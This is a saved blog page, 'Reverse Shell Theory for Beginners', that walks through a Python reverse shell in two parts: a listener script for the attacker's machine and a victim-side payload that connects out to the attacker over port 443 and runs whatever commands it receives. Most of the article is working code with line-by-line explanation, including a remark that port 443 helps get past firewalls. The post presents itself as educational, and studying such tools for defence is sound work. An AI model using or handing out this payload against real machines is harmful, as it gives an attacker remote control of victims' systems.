<!DOCTYPE html> <html style>
<meta charset=utf-8>
<meta name=viewport content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name=generator content=Jekyll>
<title>Yet Another Sample Page</title>
<style>body{margin:0;padding:0;background:#151515 url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAhQAAAIUAQMAAAB4tCemAAAABlBMVEUaGhobGxsh/u4NAAAEd0lEQVR4Xu3cPbKrMAwFYFOlZQdZqlkqS6BMFb2gHx/pZl6pVMcFk9yLvzQejZBlxjEeInKOTUTkPT5jk+N5f3qKyHH/YZ73df1N6tdjty9T4v7xfI0xlTwfN/T6kOPxvqH4JK9w7R/tBg0axzDwY+jKtUlqqHnPVBfk82Uz4pZ2gwYNDcd2yWtY1lqP9b8iNpa+jmNvN2jQQHDVMRUSRGIl7X4lNViLHBYt1P2hQYPGPBF/hxm+zG3S0k6f7j94dRs0aHjURQKBRy5RDctclHToSFnEbwwaNKBh6SOByBFbxMODrOrB3m7QoDHPXAaoaYOF43sEme6TFbG7DRo0Im14eLlAMNMSiLF5McGXvqCi4GNvN2jQkNMMLO53CtEDM59SAjOyjX6DBg08fEUNVqdvehdwn+5a/dV2gwYN1FalQD4TLgKzz0Si223QoJEnoVvgVYsJ9YFMvFwQta12gwaNqLeKFO0NA8WsPFNkRed+gwaNv3tV9zBfAdUkLtg6QBq89xs0aHj8Xb2B/mgWuMh/uloEOW63QYMG2v0QhGt6ixJCWfWrcLC3GzRoRO66rf0rNAiWZKHUwPw+g9oNGjRy7oowm7MDH+bmYB29gf0GDRoehGu5ChsGgk+3mxZ8bIBd7QYNGpm2LoDaIKjjURNdUWMF63aDBg0fcf+UeCqb0LD+PSbHD+pPX90GDRr3pDDQw6ozfVJEYnyNOO1z93aDBo3DpteGKnEI21noIbQLxjy7DRo0POBiEg6u4nQKsgM0ueAIYbtBg4ZWVJHFImPwgcoXKgp+X+x9Xd0GDRr5bD8gb2iJPiyD0BZobkCj3aBBA41/er9/ten6CYXYWoONX5Cr26BBA09bKByogS7Bep4KRS986jdo0EANVjUb2RhY4ch7BSlHv0GDBnr9UeVatw7UYG0mjgiEceztBg0ac61mpLz5kitfvv7tb7i0GzRoIG3QT/kxLCJxXeFIecNtN2jQQEegfB2wds0GcgdUGfSytxs0aES3Ss1xzcWhlnpspbZjj26DBg0deHmar+G8f7DV/djagnXj/QYNGticqlUuERylwj4rBipfV7tBg4YI3kyVX1ihBqqsquG38rPY3m7QoHE803OXhBaTUAiob6vKsbvfoEFjnisTgF/aApUsK9xGJBVXu0GDBo78QZt+wWsp10X/EYYovrcbNGjgZJWokY+olBLWKC0DU5BKtBs0aIipHoRrzUpd/Dd+ywz0sLYbNGhMVLRKlUu1wNGEjdenrgRi7zZo0DBLkCzEKymyJjGQ/CIh7jdo0KgvmazlAmzAWohW7V03wH5k0KDhRQKlaysAOlgQhPHa6ojY/QYNGmgFOGKFq5+TBQRmhb5OCnYbNGikcCw6QquTPLPFOQGcD+w3aNAQVFTxFnV0WvlXJBXhYteg26BBo/Tz53rrKrXipf7LrYWDebUbNGgMHKZOrf9IFrBDYLhezMU5rV6DBo3s59x1tbSqq1rKhSXHiKvdoEHj601/5fkMuwZ1wyBwjdP/ACfy2vdF7+1uAAAAAElFTkSuQmCC)0 0;color:#eaeaea;font-size:16px;line-height:1.5;font-family:Monaco,"Bitstream Vera Sans Mono","Lucida Console",Terminal,monospace}.container{width:90%;max-width:1000px;margin:0 auto}section{display:block;margin:0 0 20px 0}h1,h2{margin:0 0 20px}header{background:rgba(0,0,0,0.1);border-bottom:1px dashed #b5e853;padding:20px;margin:0 0 40px 0}.header-links{text-align:center}.header-link{display:inline}header h1{font-size:24px;line-height:1.5;margin:0;text-align:center;font-weight:bold;font-family:Monaco,"Bitstream Vera Sans Mono","Lucida Console",Terminal,monospace;color:#b5e853;text-shadow:0 1px 1px rgba(0,0,0,0.1),0 0 5px rgba(181,232,83,0.1),0 0 10px rgba(181,232,83,0.1);letter-spacing:-1px;-webkit-font-smoothing:antialiased}header h2{font-size:18px;font-weight:300;color:#666}#main_content{width:100%;-webkit-font-smoothing:antialiased}h1,h2{font-weight:normal;font-family:Monaco,"Bitstream Vera Sans Mono","Lucida Console",Terminal,monospace;color:#b5e853;letter-spacing:-0.03em;text-shadow:0 1px 1px rgba(0,0,0,0.1),0 0 5px rgba(181,232,83,0.1),0 0 10px rgba(181,232,83,0.1)}#main_content h1{font-size:30px}#main_content h2{font-size:24px}pre{background:rgba(0,0,0,0.9);border:1px solid rgba(255,255,255,0.15);padding:10px;font-size:16px;color:#b5e853;border-radius:2px;overflow:auto;overflow-y:hidden}hr{height:0;border:0;border-bottom:1px dashed #b5e853;color:#b5e853}a{color:#63c0f5;text-shadow:0 0 5px rgba(104,182,255,0.5)}a:active,a:focus{outline:0;border:none;-moz-outline-style:none}footer{height:50px;line-height:50px;text-align:center}#wrapper{min-height:calc(100vh - 100px)}</style>
<link href=https://cybereagle2001.github.io/atom.xml type=application/atom+xml rel=alternate title="ATOM Feed">
<title>Yet Another Sample Page | Hacker-Blog</title>
<meta name=generator content="Jekyll v3.9.2">
<meta property=og:title content="Yet Another Sample Page">
<meta name=author content=SomeHacker>
<meta property=og:locale content=en_US>
<meta name=description content="Text can be bold, italic, strikethrough or keyword.">
<meta property=og:description content="Text can be bold, italic, strikethrough or keyword.">
<link rel=canonical href=https://cybereagle2001.github.io/Blog1/Yet-Another-Sample-Page>
<meta property=og:url content=https://cybereagle2001.github.io/Blog1/Yet-Another-Sample-Page>
<meta property=og:site_name content=Hacker-Blog>
<meta property=og:type content=article>
<meta property=article:published_time content=2018-01-06T00:00:00+00:00>
<meta name=twitter:card content=summary>
<meta property=twitter:title content="Yet Another Sample Page">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"SomeHacker","url":"https://ashishchaudhary.in/hacker-blog"},"dateModified":"2018-01-06T00:00:00+00:00","datePublished":"2018-01-06T00:00:00+00:00","description":"Text can be bold, italic, strikethrough or keyword.","headline":"Yet Another Sample Page","mainEntityOfPage":{"@type":"WebPage","@id":"https://cybereagle2001.github.io/Blog1/Yet-Another-Sample-Page"},"url":"https://cybereagle2001.github.io/Blog1/Yet-Another-Sample-Page"}</script>
<style>.sf-hidden{display:none!important}</style><meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:;"><style>img[src="data:,"],source[src="data:,"]{display:none!important}</style></head>
<body data-new-gr-c-s-check-loaded=14.1067.0 data-gr-ext-installed>
 <div id=wrapper>
 <header>
 <div>
 <a href=https://cybereagle2001.github.io/Blog1/>
 
 <h1>cybereagle2001@home:~$</h1>
 </a>
 <div class=header-links>
 <a href=https://cybereagle2001.github.io/Blog1/archive><h2 class=header-link>Archive</h2></a>
<a href=https://cybereagle2001.github.io/Blog1/about><h2 class=header-link>About</h2></a>
<a href=https://cybereagle2001.github.io/Blog1/atom.xml><h2 class=header-link>RSS</h2></a>
 </div>
 </div>
</header>
 <div class=container>
 <section id=main_content>
 <article>
 <h1>Reverse Shell Theory for Beginners</h1>
 <time class=by-line>July 1, 2022</time>
 <p>A reverse shell is a shell session established on a connection initiated from a remote machine, not from the attacker’s host. Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session on the target machine and continue their attack. Reverse shells can also work across a NAT or firewall. One of the most known frameworks that ethical hackers use in order to create and communicate with a reverse shell is MSFVenom and MSFconsole.<br><br>
<strong>How does it work?</strong><br>
To understand the mechanism I decided to write a simple reverse shell in python in order to explain the basics of the reverse shell theory.</p>
<h1 id=header-1><a href=#header-1></a>Requirements</h1>
<p>To do so we need these common python libraries:
</p>
<h2 id=header-2><a href=#header-2></a>Socket</h2>
<p>
 This module provides access to the BSD socket interface. It is available on all modern Unix systems, Windows, macOS, and probably additional platforms. The Python interface is a straightforward transliteration of the Unix system call and library interface for sockets to Python’s object-oriented style: the socket() function returns a socket object whose methods implement the various socket system calls. Parameter types are somewhat higher-level than in the C interface: as with read() and write() operations on Python files, buffer allocation on receive operations is automatic, and buffer length is implicit on send operations. 
</p>
<h2 id=header-2><a href=#header-2></a>OS</h2>
<p>This module provides a portable way of using operating system-dependent functionality. We are going to use this library in order to execute the commands sent by the attacker on the victim's machine</p>
<h2 id=header-2><a href=#header-2></a>sys</h2>
<p>Python sys module has several methods and variables that can alter various aspects of the Python runtime environment. It permits operating on the interpreter by giving access and information about the constants, variables, and functions that have a strong interaction with the interpreter.</p>
<h2 id=header-2><a href=#header-2></a>subprocess</h2>
<p>The subprocess module allows you to spawn new processes, connect to their input/output/error pipes, and obtain their return codes.<h1 id=header-1><a href=#header-1>
</a>Code explication</h1><h2 id=header-2><a href=#header-2></a>server.py</h2>
<p>This is the script the hacker will be running on his machine/server this code is going to accept and establish communication with the client-side.</p>
<p>Coding the server-side we only need the socket library.
</p>
<div style="background:#f0f0f0;overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em"><pre style=margin:0;line-height:125%>server_host<span style=color:#666666>=</span> <span style=color:#4070a0>"0.0.0.0"</span>
server_port<span style=color:#666666>=</span> <span style=color:#40a070>443</span>
data_size <span style=color:#666666>=</span> <span style=color:#40a070>1024</span> <span style=color:#666666>*</span> <span style=color:#40a070>128</span>
SEPARATOR <span style=color:#666666>=</span> <span style=color:#4070a0>"&lt;sep&gt;"</span>
cyber <span style=color:#666666>=</span> socket<span style=color:#666666>.</span>socket()
</pre></div>
<p>As you can understand from the variable names the server_host is the IP address of our server/attacker_machine we used the IP 0.0.0.0 in order to make the server reachable through all the IPv4 addresses of the server. For the server_port I used port 443. We can use any port we want but ports 80 and 443 are widely used to bypass firewalls. data_size is the maximum amount of data that the client can send to the server and vice-versa. SEPARATOR is the separation between the data sent or received.</p>
<p>then I created a socket and I called it cyber this is what we are going to use in the second part of our code.</p>
<p>Let's bind the socket that we created to our server IP and port that we initiated in the first two commands.</p>
<div style="background:#f0f0f0;overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em"><pre style=margin:0;line-height:125%>cyber<span style=color:#666666>.</span>bind((server_host,server_port))
</pre></div>
<p>One of the most important parts of creating such a server is that it should have the ability to listen to and accept incoming requests that is why we need these two lines:</p>
<div style="background:#f0f0f0;overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em"><pre style=margin:0;line-height:125%>cyber<span style=color:#666666>.</span>listen(<span style=color:#40a070>10</span>)
client_socket, client_ip <span style=color:#666666>=</span> cyber<span style=color:#666666>.</span>accept()
</pre></div>
<p>the listen function will allow us to listen to the incoming connections and the parameter 10 I used is the maximum length to which the queue of pending connections for the socket may grow. That means if we receive 12 requests before we accept the connection then 2 of these requests will be dropped. The second line means that we accepted the connection from the client (our victim machine) and we stored the victim_socket and the victim_adress in two different variables.</p>
<div style="background:#f0f0f0;overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em"><pre style=margin:0;line-height:125%><span style=color:#007020;font-weight:bold>print</span>(f<span style=color:#4070a0>"{client_ip[0]}:{client_ip[1]} Connected!"</span>)
</pre></div>
<p>This output will have the following format IP:PORT connected! The first step we will do after having a connected client is to try and get the working directory on the victim's devices this is why we will use the following code:</p>
<div style="background:#f0f0f0;overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em"><pre style=margin:0;line-height:125%>cmd <span style=color:#666666>=</span> client_socket<span style=color:#666666>.</span>recv(data_size)<span style=color:#666666>.</span>decode()
<span style=color:#007020;font-weight:bold>print</span>(<span style=color:#4070a0>"[+] Current working directory:"</span>, cmd)
</pre></div>
<p>A lot of people will be asked why I used the decode function will because we need to encode the data in bytes to be sent through the victim socket. The main process of sending commands to the victim's device will be in this part of the code:</p>
<div style="background:#f0f0f0;overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em"><pre style=margin:0;line-height:125%><span style=color:#007020;font-weight:bold>while</span> <span style=color:#007020>True</span>:
    command <span style=color:#666666>=</span> <span style=color:#007020>input</span>(f<span style=color:#4070a0>"{cmd}~$ "</span>)
    <span style=color:#007020;font-weight:bold>if</span> <span style=color:#007020;font-weight:bold>not</span> command<span style=color:#666666>.</span>strip():
        <span style=color:#007020;font-weight:bold>continue</span>
    client_socket<span style=color:#666666>.</span>send(command<span style=color:#666666>.</span>encode())
    <span style=color:#007020;font-weight:bold>if</span> command<span style=color:#666666>.</span>lower() <span style=color:#666666>==</span> <span style=color:#4070a0>"exit"</span>:
        <span style=color:#007020;font-weight:bold>break</span>
    output <span style=color:#666666>=</span> client_socket<span style=color:#666666>.</span>recv(data_size)<span style=color:#666666>.</span>decode()
    results,cmd <span style=color:#666666>=</span> output<span style=color:#666666>.</span>split(SEPARATOR)
    <span style=color:#007020;font-weight:bold>print</span>(results)
</pre></div>
<p>basically what we are doing is that we are verifying if the command which is the input of the hacker is not blank if it's the case then we will encode the command and send it to the victim. If the command in lower case is exit then we will break out which means we will shut down the server and then the communication with the client will die. If the process is executed correctly then we can receive data from the victim and output. This is what the last 3 lines of code are doing on our server code.</p>
<h2 id=header-2><a href=#header-2></a>payload.py</h2>
<p>The payload is the portion of the malware which performs malicious action. In our case, the payload is the script that will be running on the victim's device.</p>
<p>let's start by importing the needed libraries and setting up the variables we will use in order to establish the communication with the attacker's server.</p>
<div style="background:#f0f0f0;overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em"><pre style=margin:0;line-height:125%>server_host <span style=color:#666666>=</span> <span style=color:#60a0b0;font-style:italic>#server_IP</span>
server_port <span style=color:#666666>=</span> <span style=color:#40a070>443</span>
data_size <span style=color:#666666>=</span> <span style=color:#40a070>1024</span> <span style=color:#666666>*</span> <span style=color:#40a070>128</span>
SEPARATOR <span style=color:#666666>=</span> <span style=color:#4070a0>"&lt;sep&gt;"</span>
victim <span style=color:#666666>=</span> socket<span style=color:#666666>.</span>socket()
victim<span style=color:#666666>.</span>connect((server_host,server_port))
</pre></div>
<p>This is made for educational purposes and the main goal is to explain the theory behind revere shells this is why we can see that the hacker's IP will be in plain text. In real-life scenarios, the payload is obfuscated so it will be so hard to identify the hacker's IP. For this part, the only difference we got from the server code is in the last line victim. connect and not bind because the victim will try to connect on the server we already created. Well, the server is waiting for our working directory which is why we should send it first to do that we will use the OS library to run a local command which is cwd the current working directory and we will send it through the socket this is done by the following code:</p>
<div style="background:#f0f0f0;overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em"><pre style=margin:0;line-height:125%>cmd <span style=color:#666666>=</span> os<span style=color:#666666>.</span>getcwd()
victim<span style=color:#666666>.</span>send(cmd<span style=color:#666666>.</span>encode())
</pre></div>
<p>the main job of the payload is that it will execute the commands sent by the attacker to do so we need to accept the received data using this line of code:</p>
<div style="background:#f0f0f0;overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em"><pre style=margin:0;line-height:125%>    command <span style=color:#666666>=</span> victim<span style=color:#666666>.</span>recv(data_size)<span style=color:#666666>.</span>decode()
    splited_command<span style=color:#666666>=</span> command<span style=color:#666666>.</span>split()
</pre></div>
<p>all what we have to do is to verify that the command is not blank, if it's an exit then we will shut down the communication then we will store the output of the executed commands and send it back to the server. All of this is made possible by this code:</p>
<div style="background:#f0f0f0;overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em"><pre style=margin:0;line-height:125%><span style=color:#007020;font-weight:bold>while</span> <span style=color:#007020>True</span>:
    command <span style=color:#666666>=</span> victim<span style=color:#666666>.</span>recv(data_size)<span style=color:#666666>.</span>decode()
    splited_command<span style=color:#666666>=</span> command<span style=color:#666666>.</span>split()
    <span style=color:#007020;font-weight:bold>if</span> command<span style=color:#666666>.</span>lower() <span style=color:#666666>==</span> <span style=color:#4070a0>"exit"</span>:
        <span style=color:#007020;font-weight:bold>break</span>
    <span style=color:#007020;font-weight:bold>if</span> splited_command[<span style=color:#40a070>0</span>]<span style=color:#666666>.</span>lower() <span style=color:#666666>==</span> <span style=color:#4070a0>"cd"</span>:
        <span style=color:#007020;font-weight:bold>try</span>:
            os<span style=color:#666666>.</span>chdir(<span style=color:#4070a0>''</span><span style=color:#666666>.</span>join(splited_command[<span style=color:#40a070>1</span>:]))
        <span style=color:#007020;font-weight:bold>except</span> FileNotFounfError <span style=color:#007020;font-weight:bold>as</span> e:
            output <span style=color:#666666>=</span> <span style=color:#007020>str</span>(e)
        <span style=color:#007020;font-weight:bold>else</span>:
            output <span style=color:#666666>=</span> <span style=color:#4070a0>""</span>
    <span style=color:#007020;font-weight:bold>else</span>:
        output <span style=color:#666666>=</span> subprocess<span style=color:#666666>.</span>getoutput(command)
    cmd <span style=color:#666666>=</span> os<span style=color:#666666>.</span>getcwd()
    message <span style=color:#666666>=</span> f<span style=color:#4070a0>"{output}{SEPARATOR}{cmd}"</span>
    victim<span style=color:#666666>.</span>send(message<span style=color:#666666>.</span>encode())
victim<span style=color:#666666>.</span>close()
</pre></div>
<p>author: cybereagle2001 (Oussama Ben Hadj Dahman)</p>
<p>
Used references : pythoncode - acunetix - docs.python - stackoverflow -wikipedia</p>
<hr>
</article>
 </section>
 </div>
 </div>
 <footer>
 <a href=https://creativecommons.org/licenses/by-nc/3.0/deed.en_US>
 <span>
 <b>SomeHacker</b>
 </span>
 
 <span>© 2022</span>
 </a>
</footer>
 
<grammarly-desktop-integration data-grammarly-shadow-root=true><template shadowroot=open><style class=sf-hidden>div.grammarly-desktop-integration{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0;-moz-user-select:none;-webkit-user-select:none;-ms-user-select:none;user-select:none}div.grammarly-desktop-integration:before{content:attr(data-content)}</style><div aria-label=grammarly-integration role=group tabindex=-1 class=grammarly-desktop-integration data-content='{"mode":"full","isActive":true,"isUserDisabled":false}'></div></template></grammarly-desktop-integration><script data-template-shadow-root>(()=>{document.currentScript.remove();processNode(document);function processNode(node){node.querySelectorAll("template[shadowroot]").forEach(element=>{let shadowRoot = element.parentElement.shadowRoot;if (!shadowRoot) {try {shadowRoot=element.parentElement.attachShadow({mode:element.getAttribute("shadowroot")});shadowRoot.innerHTML=element.innerHTML;element.remove()} catch (error) {} if (shadowRoot) {processNode(shadowRoot)}}})}})()</script>
